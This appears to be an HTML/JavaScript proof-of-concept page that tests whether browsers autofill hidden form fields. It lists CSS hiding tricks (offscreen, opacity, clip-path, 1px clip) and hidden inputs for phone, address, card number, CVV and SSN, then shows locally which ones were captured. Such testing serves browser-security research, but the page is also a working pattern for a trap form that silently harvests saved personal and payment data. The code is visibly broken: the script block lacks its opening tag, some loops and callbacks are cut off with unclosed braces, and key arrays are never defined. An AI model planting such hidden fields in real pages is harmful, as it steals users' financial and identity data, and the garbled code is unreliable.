<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PoC - Autofill Data Extraction</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #0f172a;
      color: #e2e8f0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 2rem;
    }

    h1 { font-size: 1.5rem; margin-bottom: 0.5rem; color: #f8fafc; }
    .subtitle { color: #94a3b8; margin-bottom: 2rem; font-size: 0.9rem; text-align: center; }

    /* --- Language toggle --- */
    .lang-toggle {
      position: fixed; top: 1rem; right: 1rem; z-index: 100;
      display: flex; border-radius: 8px; overflow: hidden;
      border: 1px solid #334155; background: #1e293b;
    }
    .lang-btn {
      padding: 0.4rem 0.9rem; border: none; cursor: pointer;
      font-size: 0.8rem; font-weight: 600; transition: all .2s;
      background: transparent; color: #94a3b8;
    }
    .lang-btn.active { background: #6366f1; color: #fff; }
    .lang-btn:hover:not(.active) { background: #334155; }

    /* --- Technique selector tabs --- */
    .tabs {
      display: flex; flex-wrap: wrap; gap: 0.5rem;
      justify-content: center; max-width: 1200px; margin-bottom: 1.5rem;
    }

    .tab-btn {
      padding: 0.5rem 1rem; background: #1e293b;
      border: 1px solid #334155; border-radius: 8px;
      color: #94a3b8; font-size: 0.8rem; cursor: pointer; transition: all .2s;
    }
    .tab-btn:hover { border-color: #6366f1; color: #c7d2fe; }
    .tab-btn.active { background: #6366f1; border-color: #6366f1; color: #fff; font-weight: 600; }

    .technique-info {
      background: #1e293b; border: 1px solid #334155; border-radius: 12px;
      padding: 1.25rem 1.5rem; max-width: 1200px; width: 100%; margin-bottom: 1.5rem;
    }
    .technique-info h3 { font-size: 0.95rem; color: #f8fafc; margin-bottom: 0.5rem; }
    .technique-info .css-code {
      background: #0f172a; border: 1px solid #334155; border-radius: 6px;
      padding: 0.75rem 1rem; font-family: 'Courier New', monospace;
      font-size: 0.8rem; color: #a5b4fc; margin-bottom: 0.75rem; white-space: pre;
    }
    .technique-info .expectation { font-size: 0.8rem; color: #94a3b8; line-height: 1.6; }
    .technique-info .expectation strong { color: #fbbf24; }

    .container {
      display: flex; gap: 2rem; width: 100%; max-width: 1200px;
      flex-wrap: wrap; justify-content: center;
    }

    /* --- Fake form --- */
    .fake-site {
      background: #fff; color: #1e293b; border-radius: 12px;
      padding: 2rem; width: 380px; box-shadow: 0 4px 24px rgba(0,0,0,.4);
    }
    .fake-site h2 { font-size: 1.2rem; margin-bottom: 0.25rem; }
    .fake-site .tagline { font-size: 0.8rem; color: #64748b; margin-bottom: 1.5rem; }
    .fake-site label {
      display: block; font-size: 0.8rem; font-weight: 600;
      color: #475569; margin-bottom: 0.3rem;
    }
    .fake-site input[type="text"],
    .fake-site input[type="email"] {
      width: 100%; padding: 0.6rem 0.75rem; border: 1px solid #cbd5e1;
      border-radius: 8px; font-size: 0.9rem; margin-bottom: 1rem;
      outline: none; transition: border-color .2s;
    }
    .fake-site input:focus {
      border-color: #6366f1; box-shadow: 0 0 0 3px rgba(99,102,241,.15);
    }
    .fake-site button {
      width: 100%; padding: 0.7rem; background: #6366f1; color: #fff;
      border: none; border-radius: 8px; font-size: 0.95rem;
      font-weight: 600; cursor: pointer; transition: background .2s;
    }
    .fake-site button:hover { background: #4f46e5; }

    /* ====== HIDING TECHNIQUES ====== */
    .hide-offscreen { position: absolute; left: -9999px; top: -9999px; }
    .hide-display-none { display: none; }
    .hide-visibility { visibility: hidden; height: 0; overflow: hidden; }
    .hide-opacity { opacity: 0; height: 0; overflow: hidden; }
    .hide-transform { transform: scale(0); height: 0; overflow: hidden; position: absolute; }
    .hide-clip-path { clip-path: inset(100%); position: absolute; }
    .hide-size-zero {
      font-size: 0; color: transparent; height: 0; width: 0;
      overflow: hidden; padding: 0; border: 0;
    }
    .hide-z-index {
      position: absolute; z-index: -1; opacity: 0.01;
      top: 0; left: 0; width: 1px; height: 1px; overflow: hidden;
    }
    .hide-overflow-clip {
      position: absolute; width: 1px; height: 1px;
      overflow: hidden; clip: rect(0,0,0,0); white-space: nowrap; border: 0; padding: 0;
    }

    /* --- Results panel --- */
    .results {
      background: #1e293b; border: 1px solid #334155; border-radius: 12px;
      padding: 2rem; width: 520px; box-shadow: 0 4px 24px rgba(0,0,0,.4);
      max-height: 80vh; overflow-y: auto;
    }
    .results h2 { font-size: 1.1rem; margin-bottom: 1rem; color: #f1f5f9; }
    .result-row {
      display: flex; justify-content: space-between; align-items: center;
      padding: 0.45rem 0; border-bottom: 1px solid #334155; font-size: 0.82rem;
    }
    .result-row:last-child { border-bottom: none; }
    .result-label { color: #94a3b8; min-width: 130px; }
    .result-value {
      color: #f8fafc; font-family: 'Courier New', monospace;
      font-size: 0.78rem; text-align: right; word-break: break-all;
    }
    .result-value.empty { color: #475569; font-style: italic; }
    .result-value.captured { color: #f87171; font-weight: 600; }

    .badge {
      display: inline-block; padding: 0.15rem 0.5rem; border-radius: 999px;
      font-size: 0.65rem; font-weight: 600; margin-left: 0.4rem;
    }
    .badge.visible { background: #166534; color: #bbf7d0; }
    .badge.hidden  { background: #991b1b; color: #fecaca; }
    .badge.blocked { background: #1e3a5f; color: #93c5fd; }

    .warning-box {
      background: #451a03; border: 1px solid #92400e; border-radius: 8px;
      padding: 1rem; margin-top: 1.25rem; font-size: 0.8rem;
      color: #fbbf24; line-height: 1.5;
    }

    /* --- Comparison table --- */
    .comparison {
      background: #1e293b; border: 1px solid #334155; border-radius: 12px;
      padding: 1.5rem; max-width: 1200px; width: 100%; margin-top: 2rem;
    }
    .comparison h2 { font-size: 1.1rem; margin-bottom: 1rem; color: #f1f5f9; }
    .comparison table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
    .comparison th {
      text-align: left; padding: 0.6rem 0.75rem; background: #0f172a;
      color: #94a3b8; border-bottom: 1px solid #334155; font-weight: 600; font-size: 0.75rem;
    }
    .comparison td {
      padding: 0.5rem 0.75rem; border-bottom: 1px solid #1e293b; color: #e2e8f0;
    }
    .comparison tr:hover td { background: #334155; }
    .comparison td.status-filled { color: #f87171; font-weight: 600; }
    .comparison td.status-blocked { color: #4ade80; font-weight: 600; }
    .comparison td.status-pending { color: #475569; }
    .status-filled { color: #f87171; font-weight: 600; }
    .status-blocked { color: #4ade80; font-weight: 600; }
    .status-pending { color: #475569; }

    .instructions {
      background: #1e293b; border: 1px solid #334155; border-radius: 12px;
      padding: 1.25rem 1.5rem; margin-bottom: 1.5rem; max-width: 1200px; width: 100%;
    }
    .instructions h2 { font-size: 1rem; margin-bottom: 0.75rem; color: #fbbf24; }
    .instructions ol {
      padding-left: 1.25rem; font-size: 0.85rem; color: #94a3b8; line-height: 1.8;
    }
  </style>

// ============================================================
// RENDER TABS
// ============================================================
var tabsContainer = document.getElementById('technique-tabs');
techniques.forEach(function (t, i) {
  var btn = document.createElement('button');
  btn.className = 'tab-btn' + (i === 0 ? ' active' : '');

// ============================================================
// SELECT TECHNIQUE
// ============================================================
function selectTechnique(t) {
  activeTechnique = t;

  document.querySelectorAll('.tab-btn').forEach(function (btn) {
    btn.classList.toggle('active', btn.dataset.id === t.id);
  });

  document.getElementById('technique-info').innerHTML =
    '<h3>' + t.name + '</h3>' +
    '<div class="css-code">' + escapeHtml(t.css) + '</div>' +
    '<p class="expectation">' + T(t.descKey + '_desc') + '</p>' +
    '<p class="expectation" style="margin-top:0.5rem;">' + T('expectedBehavior') + ': ' + T(t.descKey + '_exp') + '</p>';

  var techLabel = document.getElementById('current-technique-label');
  if (techLabel) techLabel.textContent = t.name;

  rebuildHiddenFields(t.className);

  var form = document.getElementById('trap-form');
  form.reset();
  form.querySelector('button').textContent = T('submitBtn');
  form.querySelector('button').style.background = '#6366f1';

  document.getElementById('results-list').innerHTML =
    '<p style="color:#475569;font-size:0.85rem;">' + T('resultsEmpty') + '</p>';
}

function rebuildHiddenFields(className) {
  var container = document.getElementById('hidden-container');
  container.innerHTML = '';
  var wrapper = document.createElement('div');
  wrapper.className = className;
  wrapper.setAttribute('aria-hidden', 'true');

  hiddenFields.forEach(function (f) {
    var input = document.createElement('input');
    input.type = 'text';
    input.name = f.name;
    input.tabIndex = -1;
    if (f.autocomplete && f.autocomplete !== 'off') {
      input.setAttribute('autocomplete', f.autocomplete);
    }
    if (f.placeholder) input.placeholder = f.placeholder;
    wrapper.appendChild(input);
  });

  container.appendChild(wrapper);
}

// ============================================================
// FORM SUBMIT — CAPTURE RESULTS
// ============================================================
var form = document.getElementById('trap-form');
form.addEventListener('submit', function (e) {
  e.preventDefault();

  var html = '';
  var capturedHidden = 0;
  var techniqueResult = {};

  // Visible fields
  visibleFields.forEach(function (f) {
    var value = form.elements[f.name] ? form.elements[f.name].value.trim() : '';
    html += '<div class="result-row">' +
      '<span class="result-label">' + T(f.labelKey) + '<span class="badge visible">' + T('badgeVisible') + '</span></span>' +
      '<span class="result-value' + (value ? '' : ' empty') + '">' + (value || T('empty')) + '</span></div>';
  });

  // Hidden fields grouped by category
  var lastCategory = '';
  hiddenFields.forEach(function (f) {
    var input = form.elements[f.name];
    var value = input ? input.value.trim() : '';
    var filled = !!value;
    techniqueResult[f.name] = filled;
    if (filled) capturedHidden++;

    if (f.category !== lastCategory) {
      lastCategory = f.category;
      var strategyLabel = f.strategy === 'autocomplete' ? 'autocomplete attr' :
                          f.strategy === 'placeholder' ? 'placeholder heuristic' : 'name/id heuristic';
      html += '<div style="margin-top:0.75rem;padding:0.35rem 0.5rem;background:#0f172a;border-radius:4px;font-size:0.7rem;color:#6366f1;font-weight:600;">' +
        f.category + ' <span style="color:#475569;font-weight:400;">(' + strategyLabel + ')</span></div>';
    }

    var displayValue = value || T('empty');
    if ((f.name === 'h-ccnum' || f.name === 'card_number' || f.name === 'credit_card' || f.name === 'numero_tarjeta') && value.length > 4) {
      displayValue = '*'.repeat(value.length - 4) + value.slice(-4);
    }
    if ((f.name === 'h-cccsc' || f.name === 'cvv' || f.name === 'ssn') && value.length > 0) {
      displayValue = '*'.repeat(value.length);
    }

    var badgeClass = filled ? 'hidden' : 'blocked';
    var badgeText = filled ? T('badgeCaptured') : T('badgeBlocked');

    html += '<div class="result-row">' +
      '<span class="result-label">' + f.label + '<span class="badge ' + badgeClass + '">' + badgeText + '</span></span>' +
      '<span class="result-value ' + (filled ? 'captured' : 'empty') + '">' + displayValue + '</span></div>';
  });

  if (capturedHidden > 0) {
    html = '<div style="background:#7f1d1d;padding:0.6rem 1rem;border-radius:8px;margin-bottom:1rem;font-size:0.85rem;color:#fca5a5;">' +
      T('hiddenCaptured').replace('{n}', capturedHidden).replace('{t}', hiddenFields.length) + '</div>' + html;
  } else {
    html = '<div style="background:#14532d;padding:0.6rem 1rem;border-radius:8px;margin-bottom:1rem;font-size:0.85rem;color:#86efac;">' +
      T('hiddenZero') + '</div>' + html;
  }

  document.getElementById('results-list').innerHTML = html;
  comparisonResults[activeTechnique.id] = techniqueResult;
  renderComparison();
});

// ============================================================
// LIVE MONITORING
// ============================================================
setInterval(function () {
  var filled = 0;
  hiddenFields.forEach(function (f) {
    var input = form.elements[f.name];
    if (input && input.value.trim()) filled++;

  var btn = form.querySelector('button');
  if (filled > 0) {
    btn.textContent = T('submitBtnHidden').replace('{n}', filled);
    btn.style.background = '#dc2626';

}, 500);

// ============================================================
// COMPARISON TABLE
// ============================================================
var comparisonFields = [
  { name: 'h-phone',        border: true },
  { name: 'h-street',       border: false },
  { name: 'h-ccnum',        border: false },
  { name: 'phone_number',   border: true },
  { name: 'address',        border: false },
  { name: 'card_number',    border: false },
  { name: 'telefono',       border: true },
  { name: 'direccion',      border: false },
  { name: 'numero_tarjeta', border: false },
  { name: 'field_a',        border: true },
  { name: 'field_d',        border: false },
];

function renderComparison() {
  var tbody = document.getElementById('comparison-body');
  var html = '';

  techniques.forEach(function (t) {
    var result = comparisonResults[t.id];
    html += '<tr><td><strong>' + t.name + '</strong></td>';

    comparisonFields.forEach(function (cf) {
      var bs = cf.border ? 'border-left:2px solid #334155;' : '';
      if (!result) {
        html += '<td class="status-pending" style="' + bs + '">--</td>';
      } else if (result[cf.name]) {
        html += '<td class="status-filled" style="' + bs + '">FILLED</td>';
      } else {
        html += '<td class="status-blocked" style="' + bs + '">BLOCKED</td>';
      }
    });

    if (!result) {
      html += '<td class="status-pending" style="border-left:2px solid #334155;">' + T('notTested') + '</td>';
    } else {
      var tot = 0;
      hiddenFields.forEach(function (f) { if (result[f.name]) tot++; });
      if (tot === 0) {
        html += '<td class="status-blocked" style="border-left:2px solid #334155;">0/' + hiddenFields.length + '</td>';
      } else {
        html += '<td class="status-filled" style="border-left:2px solid #334155;">' + tot + '/' + hiddenFields.length + '</td>';
      }
    }
    html += '</tr>';
  });

  tbody.innerHTML = html;
}

// ============================================================
// BROWSER DETECTION
// ============================================================
function detectBrowser() {
  var ua = navigator.userAgent;
  var browser = '?', version = '', engine = '';

  if (ua.indexOf('Firefox') > -1) { browser = 'Firefox'; version = (ua.match(/Firefox\/([\d.]+)/) || [])[1] || ''; engine = 'Gecko'; }
  else if (ua.indexOf('Edg/') > -1) { browser = 'Edge'; version = (ua.match(/Edg\/([\d.]+)/) || [])[1] || ''; engine = 'Chromium'; }
  else if (ua.indexOf('OPR/') > -1) { browser = 'Opera'; version = (ua.match(/OPR\/([\d.]+)/) || [])[1] || ''; engine = 'Chromium'; }
  else if (ua.indexOf('Chrome') > -1) { browser = 'Chrome'; version = (ua.match(/Chrome\/([\d.]+)/) || [])[1] || ''; engine = 'Chromium'; }
  else if (ua.indexOf('Safari') > -1) { browser = 'Safari'; version = (ua.match(/Version\/([\d.]+)/) || [])[1] || ''; engine = 'WebKit'; }

  if (navigator.brave && typeof navigator.brave.isBrave === 'function') { browser = 'Brave'; engine = 'Chromium'; }

  var platform = '?';
  if (ua.indexOf('Win') > -1) platform = 'Windows';
  else if (ua.indexOf('Mac') > -1) platform = 'macOS';
  else if (ua.indexOf('Linux') > -1) platform = 'Linux';
  else if (ua.indexOf('Android') > -1) platform = 'Android';
  else if (/iPhone|iPad/.test(ua)) platform = 'iOS';

  return { browser: browser, version: version, engine: engine, platform: platform };
}

function renderBrowserInfo() {
  var info = detectBrowser();
  var locale = currentLang === 'es' ? 'es-AR' : 'en-US';
  var dateStr = new Date().toLocaleDateString(locale) + ' ' + new Date().toLocaleTimeString(locale, { hour: '2-digit', minute: '2-digit' });

  var items = [
    { label: T('browserLabel'), value: info.browser + ' ' + info.version },
    { label: T('engineLabel'),  value: info.engine },
    { label: T('platformLabel'), value: info.platform },
    { label: T('testDateLabel'), value: dateStr },
  ];

  document.getElementById('browser-info').innerHTML = items.map(function (item) {
    return '<div><span style="color:#475569;">' + item.label + ':</span> <strong style="color:#f8fafc;">' + item.value + '</strong></div>';
  }).join('');
}

function escapeHtml(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}
